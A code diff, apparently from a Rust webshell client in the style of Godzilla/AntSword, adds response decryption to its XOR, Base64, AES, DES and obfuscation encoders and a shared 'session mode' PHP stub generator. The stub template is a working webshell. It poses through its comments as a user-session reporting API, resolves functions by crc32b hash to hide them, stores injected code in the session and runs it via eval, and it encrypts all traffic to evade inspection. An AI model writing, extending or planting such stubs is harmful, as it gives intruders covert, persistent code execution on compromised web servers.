@@ -264,8 +264,23 @@ pub trait PayloadEncoder: Send + Sync {
     /// 客户端：编码协议代码为传输载荷。
     fn encode(&self, code: &str, password: &str) -> String;
 
+    /// 客户端：解密服务端响应（encode 的逆操作），返回原始字节。
+    /// 仅 session 模式（分阶段载荷）需要；默认不支持。
+    fn decode(&self, _payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
+        Err(ProtocolError::NotSupported(
+            "该编码器不支持响应解密".into(),
+        ))
+    }
+
     /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;
+
+    /// 服务端：Godzilla 分阶段载荷（session 模式）stub。
+    /// 处理器代码只注入一次，后续请求只传参数；请求/响应全程加密。
+    /// 默认回退为普通 stub（php_stream 等不适用 session 的编码器）。
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        self.stub(language, password)
+    }
 }
 
 /// 编码器注册表。
@@ -351,6 +366,14 @@ impl PayloadEncoder for XorBase64Encoder {
         let xored = Self::xor(code.as_bytes(), &key);
         base64::engine::general_purpose::STANDARD.encode(xored)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        let key = md5_hex(password).into_bytes();
+        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = self.derive_key(password);
@@ -443,6 +466,34 @@ if (x != null) {{
             ))),
         }
     }
+
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let key_hex = md5_hex(password);
+                let xk = php_ident();
+                let key_enc = xor_hex(&key_hex, &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
+                    key = key_enc,
+                    xk = xk,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
+                    key = key_enc,
+                    xk = xk,
+                );
+                Ok(session_php_stub(
+                    &[(0, "base64_decode"), (1, "base64_encode")],
+                    &unpack,
+                    &pack,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
 }
 
 /// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
@@ -465,6 +516,12 @@ impl PayloadEncoder for Base64Encoder {
     fn encode(&self, code: &str, _password: &str) -> String {
         base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
     }
+    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
+        base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))
+    }
+
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -484,6 +541,18 @@ impl PayloadEncoder for Base64Encoder {
             ),
             other => Err(ProtocolError::NotSupported(format!(
                 "BASE64 编码器不支持语言：{other}"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => Ok(session_php_stub(
+                &[(0, "base64_decode"), (1, "base64_encode")],
+                "    $out = $_g[0]($payload);",
+                "    $out = $_g[1]($data);",
+            )),
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -629,6 +698,13 @@ impl PayloadEncoder for Aes128EcbEncoder {
         let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
         base64::engine::general_purpose::STANDARD.encode(cipher)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        aes_ecb_decrypt(&raw, &aes_key(password))
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
@@ -643,6 +719,37 @@ impl PayloadEncoder for Aes128EcbEncoder {
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let xk = php_ident();
+                let ck = php_ident();
+                let key_enc = xor_hex(&md5_hex(password)[..16], &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key);",
+                    key = key_enc,
+                    xk = xk,
+                    cipher = xor_hex("AES-128-ECB", &ck),
+                    ck = ck,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key);",
+                    key = key_enc,
+                    xk = xk,
+                    cipher = xor_hex("AES-128-ECB", &ck),
+                    ck = ck,
+                );
+                Ok(session_php_stub(
+                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
+                    &unpack,
+                    &pack,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -672,6 +779,13 @@ impl PayloadEncoder for Aes128CbcEncoder {
         let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
         base64::engine::general_purpose::STANDARD.encode(cipher)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        aes_cbc_decrypt(&raw, &aes_key(password), &aes_iv(password))
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
@@ -687,6 +801,40 @@ impl PayloadEncoder for Aes128CbcEncoder {
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let xk = php_ident();
+                let ck = php_ident();
+                let key_enc = xor_hex(&md5_hex(password)[..16], &xk);
+                let iv_enc = xor_hex(&md5_hex(password)[16..], &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $iv = __PREFIX__dec('{iv}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key, 0, $iv);",
+                    key = key_enc,
+                    xk = xk,
+                    iv = iv_enc,
+                    cipher = xor_hex("AES-128-CBC", &ck),
+                    ck = ck,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $iv = __PREFIX__dec('{iv}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key, 0, $iv);",
+                    key = key_enc,
+                    xk = xk,
+                    iv = iv_enc,
+                    cipher = xor_hex("AES-128-CBC", &ck),
+                    ck = ck,
+                );
+                Ok(session_php_stub(
+                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
+                    &unpack,
+                    &pack,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -716,6 +864,13 @@ impl PayloadEncoder for DesEcbEncoder {
         let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
         base64::engine::general_purpose::STANDARD.encode(cipher)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        des_ecb_decrypt(&raw, &des_key(password))
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = String::from_utf8_lossy(&des_key(password)).into_owned();
@@ -730,6 +885,37 @@ impl PayloadEncoder for DesEcbEncoder {
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let xk = php_ident();
+                let ck = php_ident();
+                let key_enc = xor_hex(&md5_hex(password)[..8], &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key);",
+                    key = key_enc,
+                    xk = xk,
+                    cipher = xor_hex("DES-ECB", &ck),
+                    ck = ck,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key);",
+                    key = key_enc,
+                    xk = xk,
+                    cipher = xor_hex("DES-ECB", &ck),
+                    ck = ck,
+                );
+                Ok(session_php_stub(
+                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
+                    &unpack,
+                    &pack,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -760,6 +946,10 @@ impl PayloadEncoder for CharEncoder {
         let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
         format!("{}(implode('',array_map('chr',array({}))));", case_mix("eval"), values.join(","))
     }
+    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
+        Ok(char_decode(payload)?.into_bytes())
+    }
+
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -770,6 +960,18 @@ impl PayloadEncoder for CharEncoder {
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => Ok(session_php_stub(
+                &[],
+                "    preg_match_all('/\\d+/', $payload, $m);\n    $out = implode('', array_map('chr', array_map('intval', $m[0])));",
+                "    $out = \"implode('',array_map('chr',array(\" . implode(',', array_map('ord', str_split($data))) . \")));\";",
+            )),
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -815,6 +1017,10 @@ impl PayloadEncoder for PhpObfuscateEncoder {
         let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
         format!("{}({decode_call});", case_mix("eval"))
     }
+    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
+        Ok(obfuscate_decode(payload)?.into_bytes())
+    }
+
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -825,6 +1031,18 @@ impl PayloadEncoder for PhpObfuscateEncoder {
             )),
             other => Err(ProtocolError::NotSupported(format!(
                 "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+    fn stub_session(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => Ok(session_php_stub(
+                &[(0, "base64_decode"), (1, "base64_encode")],
+                "    $p = substr($payload, strpos($payload, \"strrev('\") + 8);\n    $p = substr($p, 0, strpos($p, \"')\"));\n    $out = $_g[0](strrev($p));",
+                "    $out = \"strrev('\" . strrev($_g[1]($data)) . \"')\";",
+            )),
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
@@ -930,6 +1148,14 @@ impl PayloadEncoder for XorBodyEncoder {
             .collect();
         base64::engine::general_purpose::STANDARD.encode(xored)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        let key = md5_hex(password).into_bytes();
+        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -962,6 +1188,7 @@ function __PREFIX__dec($hex, $key) {
     for ($i = 0; $i < $n; $i++) {
         $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
     }
+
     return $out;
 }
 
@@ -1002,6 +1229,33 @@ echo json_encode(__PREFIX__run_rule($script));
             ))),
         }
     }
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let key_hex = md5_hex(password);
+                let xk = php_ident();
+                let key_enc = xor_hex(&key_hex, &xk);
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
+                    key = key_enc,
+                    xk = xk,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
+                    key = key_enc,
+                    xk = xk,
+                );
+                Ok(session_php_stub(
+                    &[(0, "base64_decode"), (1, "base64_encode")],
+                    &unpack,
+                    &pack,
+                ))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "该编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -1019,6 +1273,102 @@ echo json_encode(__PREFIX__run_rule($script));
 
 /// Godzilla 初始化标记（处理器代码中必须包含，stub 据此识别初始化请求）。
 pub const SESSION_INIT_MARK: &str = "DswSesInit";
+
+/// Godzilla 分阶段载荷（session 模式）的统一 stub 骨架。
+/// 处理器代码一次注入服务端 session，后续请求只传参数；请求/响应全程加密。
+/// 占位符：__PREFIX__（随机前缀）、__SYMBOLS__（crc32b 符号表）、
+/// __UNPACK__（请求体解密）、__PACK__（响应加密）。
+const SESSION_STUB_TPL: &str = r#"<?php
+// 用户会话数据上报接口（返回 JSON）
+// 业务：按会话维护客户端上报的压缩规则脚本，每次上报执行规则并返回状态
+@session_start();
+header('Content-Type: application/json');
+
+// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
+$_g = array();
+$_t = array(
+__SYMBOLS__);
+$_fn = get_defined_functions();
+$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
+foreach ($_fn as $_n) {
+    $_h = hash('crc32b', $_n);
+    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
+}
+
+function __PREFIX__dec($hex, $key) {
+    $out = '';
+    $n = strlen($hex) / 2;
+    for ($i = 0; $i < $n; $i++) {
+        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
+    }
+    return $out;
+}
+
+function __PREFIX__x($d, $k) {
+    $out = '';
+    $n = strlen($d);
+    for ($i = 0; $i < $n; $i++) { $out .= $d[$i] ^ $k[$i % strlen($k)]; }
+    return $out;
+}
+
+function __PREFIX__unpack($payload) {
+    global $_g;
+__UNPACK__
+    return $out;
+}
+
+function __PREFIX__pack($data) {
+    global $_g;
+__PACK__
+    return $out;
+}
+
+$payload = @file_get_contents('php://input');
+if ($payload === false || $payload === '') {
+    die('{"code":400,"msg":"empty_payload"}');
+}
+$data = __PREFIX__unpack($payload);
+if (isset($_SESSION['__PREFIX__p'])) {
+    if (strpos($data, 'DswSesInit') !== false) {
+        echo __PREFIX__pack('ok');
+    } else {
+        $code = __PREFIX__unpack($_SESSION['__PREFIX__p']);
+        if (!function_exists('run')) { EvAl($code); }
+        echo __PREFIX__pack(run($data));
+    }
+} else {
+    if (strpos($data, 'DswSesInit') !== false) {
+        $_SESSION['__PREFIX__p'] = __PREFIX__pack($data);
+        echo __PREFIX__pack('ok');
+    } else {
+        echo __PREFIX__pack('no_init');
+    }
+}
+"#;
+
+/// 生成 Godzilla 分阶段载荷（session 模式）stub。
+/// `symbols`：运行时符号表（索引 + 函数名，crc32b 查表）；
+/// `unpack_body`：请求体解密逻辑（$payload -> $out）；
+/// `pack_body`：响应加密逻辑（$data -> $out）。
+pub fn session_php_stub(
+    symbols: &[(usize, &str)],
+    unpack_body: &str,
+    pack_body: &str,
+) -> String {
+    let prefix = format!("_{}_", php_ident());
+    // unpack/pack 参数中引用的 __PREFIX__（dec / x 函数名）随前缀替换
+    let unpack_body = unpack_body.replace("__PREFIX__", &prefix);
+    let pack_body = pack_body.replace("__PREFIX__", &prefix);
+    let mut table = String::new();
+    for (index, name) in symbols {
+        table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
+    }
+    SESSION_STUB_TPL
+        .replace("__PREFIX__", &prefix)
+        .replace("__SYMBOLS__", &table)
+        .replace("__UNPACK__", &unpack_body)
+        .replace("__PACK__", &pack_body)
+}
 
 /// 处理器代码：一次传输后驻留服务端 session，定义 run($p) 处理全部操作。
 /// 参数 JSON：{a: 操作名, n: nonce, ...}；返回 nonce 帧包裹的 JSON。
@@ -1173,90 +1523,42 @@ impl PayloadEncoder for XorSessionEncoder {
             .collect();
         base64::engine::general_purpose::STANDARD.encode(xored)
     }
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        let key = md5_hex(password).into_bytes();
+        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+    }
+
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        // 分阶段载荷编码器：普通 stub 即 session 模板
+        self.stub_session(language, password)
+    }    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => {
                 let key_hex = md5_hex(password);
                 let xk = php_ident();
                 let key_enc = xor_hex(&key_hex, &xk);
-                // 业务伪装：会话数据上报接口（session 管理 + 解压 + 规则引擎）
-                let tpl = r#"<?php
-// 用户会话数据上报接口（返回 JSON）
-// 业务：按会话维护客户端上报的压缩规则脚本，每次上报执行规则并返回状态
-@session_start();
-header('Content-Type: application/json');
-
-// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
-$_g = array();
-$_t = array(
-    '9ff5d542' => 0,
-);
-$_fn = get_defined_functions();
-$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
-foreach ($_fn as $_n) {
-    $_h = hash('crc32b', $_n);
-    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
-}
-
-function __PREFIX__dec($hex, $key) {
-    $out = '';
-    $n = strlen($hex) / 2;
-    for ($i = 0; $i < $n; $i++) {
-        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
-    }
-    return $out;
-}
-
-function __PREFIX__x($d, $k) {
-    $out = '';
-    $n = strlen($d);
-    for ($i = 0; $i < $n; $i++) { $out .= $d[$i] ^ $k[$i % strlen($k)]; }
-    return $out;
-}
-
-function __PREFIX__unpack($payload) {
-    global $_g;
-    $raw = $_g[0]($payload);
-    $key = __PREFIX__dec('{KEYENC}', '{XK}');
-    return __PREFIX__x($raw, $key);
-}
-
-function __PREFIX__pack($data) {
-    $key = __PREFIX__dec('{KEYENC}', '{XK}');
-    return base64_encode(__PREFIX__x($data, $key));
-}
-
-$payload = @file_get_contents('php://input');
-if ($payload === false || $payload === '') {
-    die('{"code":400,"msg":"empty_payload"}');
-}
-$data = __PREFIX__unpack($payload);
-if (isset($_SESSION['__PREFIX__p'])) {
-    if (strpos($data, 'DswSesInit') !== false) {
-        echo __PREFIX__pack('ok');
-    } else {
-        $code = __PREFIX__unpack($_SESSION['__PREFIX__p']);
-        if (!function_exists('run')) { EvAl($code); }
-        echo __PREFIX__pack(run($data));
-    }
-} else {
-    if (strpos($data, 'DswSesInit') !== false) {
-        $_SESSION['__PREFIX__p'] = __PREFIX__pack($data);
-        echo __PREFIX__pack('ok');
-    } else {
-        echo __PREFIX__pack('no_init');
-    }
-}
-"#;
-                let prefix = format!("_{}_", php_ident());
-                Ok(tpl
-                    .replace("__PREFIX__", &prefix)
-                    .replace("{KEYENC}", &key_enc)
-                    .replace("{XK}", &xk))
+                let unpack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
+                    key = key_enc,
+                    xk = xk,
+                );
+                let pack = format!(
+                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
+                    key = key_enc,
+                    xk = xk,
+                );
+                Ok(session_php_stub(
+                    &[(0, "base64_decode"), (1, "base64_encode")],
+                    &unpack,
+                    &pack,
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
-                "XOR_SESSION 编码器暂仅支持 PHP（{other} 待实现）"
+                "该编码器暂仅支持 PHP（{other} 待实现）"
             ))),
         }
     }
